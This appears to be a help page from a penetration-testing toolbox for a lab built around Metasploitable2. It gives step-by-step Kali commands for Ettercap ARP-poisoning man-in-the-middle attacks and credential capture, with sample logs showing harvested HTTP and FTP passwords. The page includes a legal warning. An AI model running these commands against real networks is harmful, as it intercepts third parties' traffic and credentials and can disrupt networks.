⚠️ Why Ettercap is not directly integrated

Ettercap requires direct access to the network interface of the host machine to perform ARP poisoning. Running inside a Docker container with network isolation prevents it from intercepting traffic between other hosts on the network.

  • ARP poisoning requires raw socket access at Layer 2 (Ethernet)
  • Docker network namespaces prevent access to the host network bridge
  • MITM attacks need to be on the same physical/logical network segment as victims

Solution: Run Ettercap directly on Kali (outside Docker) on the same network as the target, then import the log file into the Toolbox using the upload feature below.

🚨 Legal Warning — MITM is extremely intrusive

ARP poisoning and MITM attacks are illegal without explicit written authorization. These attacks affect ALL devices on the network segment — not just the intended target. They can cause network outages, data corruption, and expose credentials of third parties. Art. 323-1 Code Pénal (France) — up to 5 years imprisonment for unauthorized interception.

🛠️ How to run Ettercap on Kali (outside Docker)

Step 1 — Identify your network interface and targets

# Check your interface (eth0, eth1, etc.)
ip addr show
# Scan the network to identify targets
nmap -sn 192.168.200.0/24
# Note: VICTIM = target IP, GATEWAY = router IP

Step 2 — Enable IP forwarding

# Required for MITM (forward packets between victim and gateway)
sudo sysctl -w net.ipv4.ip_forward=1

Step 3 — Launch Ettercap (CLI mode)

# ARP poisoning between victim and gateway, save log to file
sudo ettercap -T -q -i eth1 \
-M arp:remote \
/192.168.200.133// \
/192.168.200.1// \
-w /tmp/ettercap_capture.pcap \
-l /tmp/ettercap_results.log
# Press Ctrl+C to stop when done
# -T = text mode, -q = quiet, -i = interface
# -M arp:remote = ARP poisoning
# -w = write raw packets (PCAP), -l = write log

Step 4 — Target-specific credentials capture

# With plugin for credential extraction
sudo ettercap -T -q -i eth1 \
-M arp:remote \
/192.168.200.133// /192.168.200.1// \
-P autoadd \
-l /tmp/ettercap_credentials.log
# Captured credentials appear in the log file

Step 5 — Expected output format

# Example of ettercap log output (.log file)
ettercap 0.8.3 copyright 2001-2020 Ettercap Development Team
Listening on:
eth1 -> 00:0C:29:A6:91:24
ARP poisoning victims:
GROUP 1 : 192.168.200.133
GROUP 2 : 192.168.200.1
HTTP : 192.168.200.133:80 -> USER: admin PASS: password123 INFO: http://target/login
FTP : 192.168.200.133:21 -> USER: ftp PASS: ftp
✅ Accepted file formats for upload:
  • .log or .txt — Ettercap text log (from -l flag)
  • .pcap or .cap — Raw packet capture (from -w flag)
  • Maximum file size: 100 MB

  • Use eth1 (NAT) to reach Metasploitable2
  • MITM affects the entire network segment
  • Always restore ARP tables after the attack
  • Ettercap may cause network instability
  • Duration: keep short (1-2 min) in lab
